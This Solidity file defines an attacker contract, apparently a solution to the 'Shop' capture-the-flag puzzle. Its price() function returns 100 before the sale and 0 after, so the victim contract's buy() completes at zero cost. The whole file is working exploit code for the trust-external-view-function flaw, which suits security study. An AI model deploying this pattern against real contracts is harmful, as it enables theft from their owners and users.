// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {Shop} from "./Shop.sol";

contract ShopAttacker {
    function attack(address victimAddress) public {
        Shop(victimAddress).buy();
    }

    function price() external view returns (uint) {
        return Shop(msg.sender).isSold() ? 0 : 100;
    }
}
